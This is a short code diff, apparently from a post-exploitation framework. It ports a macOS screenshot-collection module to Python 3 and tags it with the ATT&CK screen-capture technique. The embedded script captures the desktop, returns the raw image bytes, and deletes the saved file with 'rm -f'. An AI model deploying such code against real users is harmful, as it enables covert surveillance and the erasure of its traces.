@@ -1,7 +1,9 @@
 import base64
 import os
+from builtins import object
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -15,6 +17,10 @@ class Module:
 
             # more verbose multi-line description of the module
             'Description': ('Takes a screenshot of an OSX desktop using the Python mss module. The python-mss module utilizes ctypes and the CoreFoundation library.'),
+
+            'Software': '',
+
+            'Techniques': ['T1113'],
 
             # True if the module needs to run in the background
             'Background': False,
@@ -101,9 +107,10 @@ def run(data):
     file = m.shot(mon=%s,output='%s')
     raw = open(file, 'rb').read()
     run_command('rm -f %%s' %% (file))
-    print raw
+    print(raw)
 
 run(data)
 """ % (module_data, self.options['Monitor']['Value'], self.options['SavePath']['Value'])
 
         return script
+
